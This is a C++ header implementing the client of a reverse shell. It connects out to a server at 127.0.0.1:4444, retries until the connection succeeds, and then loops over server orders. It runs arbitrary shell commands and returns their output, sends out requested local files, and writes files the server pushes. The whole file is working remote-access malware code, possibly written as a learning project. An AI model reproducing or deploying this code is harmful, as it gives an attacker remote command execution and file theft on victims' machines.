#pragma once 
#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "CommandExecuter.h"
#include "ReverseShellStandardFunctions.hpp"

class Client : private ReverseShellStandard
{
public:
	Client()
		: ReverseShellStandard()
	{
		Connect();
		Start();
		m_ioService.run();
	}

private:

	void Connect() override final
	{
		using TcpResolver = boost::asio::ip::tcp::resolver;
		TcpResolver resolver(m_ioService);
		auto endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });

		while (true)
		{
			boost::asio::connect(m_socket, endpointIterator, m_errorCode);
			if (!m_errorCode)
				return;

			std::cout << "Coudn't connect to server. Check that it is up and listening " << std::endl;
			m_socket.close();
			std::this_thread::sleep_for(std::chrono::seconds(3));
		}

		std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
	}

	void Start()
	{
		while (true)
		{
			switch (ReadOperationType())
			{
			case RUN_COMMAND:
				RunCommand();
				break;
			case DOWNLOAD_FILE:
				UploadFile();
				break;
			case UPLOAD_FILE:
				DownloadFile();
				break;
			default:
				InvalidOperation();
				break;
			}

			m_responseBuf.consume(m_responseBuf.size());
		}
	}

	OperationType ReadOperationType() override final
	{
		auto operation = Response();
		return GetOperationType(operation);		
	}

	void RunCommand() override final
	{
		auto command = Response();
		std::cout << "Command to Run: " << command << std::endl;
		auto commandResult = RunShellCommand(command);
		std::cout << "Command Result: " << commandResult << std::endl;
		Send(commandResult);
	}

	std::string RunShellCommand(const std::string& command)
	{
		std::string commandResult;
		try
		{
			CommandExecuter commandExecuter;
			commandResult = commandExecuter.RunShellCommand(command);
		}
		catch (const boost::process::process_error& ex)
		{
			if (ex.code().value() != CommandExecuter::ShellCommandErrorCode)
				throw boost::process::process_error(ex);

			commandResult = (boost::format("Running command failed! \nError Code: %1% \nError Message: %2%") % ex.code().value() % ex.what()).str();
		}

		return std::move(commandResult);
	}

	void UploadFile() override final
	{
		auto localFilePath = Response();
		std::cout << "File that server wants: " << localFilePath << std::endl;
		if (!TellServerIfFileExists(localFilePath))
			return;

		ReverseShellStandard::UploadFile(localFilePath);
		std::cout << "File uploaded (local): " << localFilePath << std::endl;
	}

	void DownloadFile() override final
	{
		auto filePath = Response();
		std::cout << "Where to store the uploaded file: " << filePath << std::endl;
		TellServerIfFileExists(filePath);
		OpenFileFor(filePath, std::ios::out | std::ios::binary);
		ReverseShellStandard::DownloadFile(filePath);
	}

	bool TellServerIfFileExists(const std::string& filePath)
	{
		auto fileExists = IsRegularFileExists(filePath);
		Send(std::to_string(fileExists));
		return fileExists;
	}

	void InvalidOperation() override final
	{
		throw NetworkExcetion("The server sent an invalid request. Reconnecting...");
	}
};
